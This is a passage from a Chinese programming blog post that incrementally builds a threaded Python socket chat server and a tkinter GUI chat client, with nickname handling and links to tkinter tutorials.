comment">#子线程负责从服务端接受数据并打印</span>        content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> word <span class="token operator">==</span> <span class="token string">'close'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token comment"># 主线程负责将用户输入的数据发送到socket中</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>word<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-6"><a href="#0-6" class="headerlink" title="0.6"></a><strong>0.6</strong></h3><p><strong>作用：0.5基础上优化（nickname）+进行图形界面可视化；</strong></p><blockquote><p>Python 提供了多个图形开发界面的库，几个常用 Python GUI 库如下：</p><ul><li><strong>Tkinter：</strong> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</li></ul><p><strong>注意</strong><em>：Python3.x 版本使用的库名为 tkinter,即首写字母 T 为小写</em></p><p>创建一个GUI程序</p><ul><li>1、导入 Tkinter 模块</li><li>2、创建控件</li><li>3、指定这个控件的 master， 即这个控件属于哪一个</li><li>4、告诉 GM(geometry manager) 有一个控件产生了。</li></ul></blockquote><blockquote><p>[Python GUI 编程(Tkinter) | 菜鸟教程 (runoob.com)](<a href="https://www.runoob.com/python/python-gui-tkinter.html#:~:text=Tkinter">https://www.runoob.com/python/python-gui-tkinter.html#:~:text=Tkinter</a> 是 Python 的标准 GUI 库。 Python 使用,Tkinter 库、而且 IDLE 也是用 Tkinter 编写而成、对于简单的图形界面 Tkinter 还是能应付自如。)</p><p><a href="https://blog.csdn.net/Eider1998/article/details/104725180">(29条消息) TK-StringVar_Eider1998的博客-CSDN博客_stringvar()作用</a></p><p><a href="https://www.runoob.com/python/python-tk-frame.html">Python Tkinter 框架控件（Frame） | 菜鸟教程 (runoob.com)</a></p><p><a href="https://blog.csdn.net/Bugest/article/details/81557112">(29条消息) python弹窗——tkinter.messagebox学习总结_鹿鹿有为啊的博客-CSDN博客_python tkinter 弹窗</a></p><p><a href="https://www.cnblogs.com/zmzzm/p/11973217.html">tkinter的set()与get() - 做梦者造梦 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/qq_46018418/article/details/105927203">(29条消息) tkinter库最全使用教程_千禧皓月的博客-CSDN博客_tkinter</a></p><p><a href="https://blog.csdn.net/superfanstoprogram/article/details/83713196">(29条消息) 用tkinter.pack设计复杂界面布局_快乐清风客的博客-CSDN博客_tkinter复杂界面</a></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">8000</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>Nickname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token comment"># print(str(addr)+'已加入！')</span>        <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>            i <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                    <span class="token keyword">break</span>        Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#历史消息生成</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TextList<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'No message.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>TextList<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>        <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-65"><a href="#0-65" class="headerlink" title="0.65"></a><strong>0.65</strong></h3><p><strong>作用：0.6基础上的修改（显示在线人数和历史消息暂时删了，仅保留了聊天功能），先能用……还要解决子线程如何关闭的问题……</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># s.send((','.join(Nickname)).encode('utf-8')) #将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(repr())</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># print(str(addr)+'已加入！')</span>    <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">break</span>    Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># #历史消息生成</span>    <span class="token comment"># if len(TextList)==0:</span>    <span class="token comment">#     client.send('No message.'.encode('utf-8'))</span>    <span class="token comment"># else:</span>    <span class="token comment">#     client.send('\n'.join(TextList).encode('utf-8'))</span>    cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>    <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token comment">#弹窗库</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> scrolledtext  <span class="token comment">#滚动文本框</span>server_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">9999</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span><span class="token comment">#登入窗口：输入呢称</span><span class="token keyword">def</span> <span class="token function">LoginWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · 登录'</span><span class="token punctuation">)</span> <span class="token comment">#窗口标题</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'300x150'</span><span class="token punctuation">)</span> <span class="token comment">#窗口大小</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span> <span class="token comment">#改变窗体位置（‘+横坐标+纵坐标’）</span>    nickname <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#昵称变量（对象）:在使用界面编程的时候，有些时候是需要跟踪变量的值的变化，以保证值的变更随时可以显示在界面上</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#将窗口大小设置为不可变</span>    <span class="token comment">#登录函数（检查用户名是否为空，以及长度）</span>    <span class="token keyword">def</span> <span class="token function">Login_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> nickname<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#????</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名为空！'</span><span class="token punctuation">)</span> <span class="token comment">#消息警告框</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名过长！最多为十个字符！'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传递用户昵称</span>            ChatRoom<span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment"># 打开聊天窗口</span>    <span class="token comment">#登录按钮、输入提示标签、输入框</span>    Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>Login_in<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">)</span>    Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'请输入昵称'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>    Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> textvariable<span class="token operator">=</span>nickname<span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#聊天窗口</span><span class="token keyword">def</span> <span class="token function">ChatRoom</span><span class="token punctuation">(</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'650x400'</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口大小</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 将窗口大小设置为不可变</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span>  <span class="token comment"># 改变窗体位置（‘+横坐标+纵坐标’）</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    <span class="token comment"># if content != 'No message.':</span>    <span class="token comment">#     past_text = content + '\n------以上是历史消息------\n'</span>    <span class="token comment"># 从服务器端获取当前用户列表</span>    <span class="token comment"># UserList = []</span>    <span class="token comment"># UserList = 